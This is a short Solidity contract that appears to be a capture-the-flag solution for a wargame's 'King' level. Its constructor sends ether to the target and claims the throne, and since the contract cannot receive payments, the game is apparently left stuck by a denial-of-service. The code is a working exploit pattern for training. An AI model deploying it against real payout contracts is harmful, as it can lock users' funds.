// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel09.sol";

contract UltimateKing {
    constructor(address king) payable {
        payable(king).call{value: msg.value}("");
    }
}
